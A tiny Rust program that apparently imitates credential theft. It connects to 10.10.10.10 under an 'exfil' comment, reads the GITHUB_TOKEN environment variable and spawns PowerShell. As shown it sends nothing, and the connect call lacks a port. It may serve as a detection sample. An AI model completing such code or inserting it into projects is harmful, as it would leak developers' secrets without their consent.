use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.10.10.10") { /* exfil */ }
    let _v = env::var("GITHUB_TOKEN").unwrap_or_default();
    Command::new("powershell").arg("-Command").arg("Get-Process").spawn().ok();
}
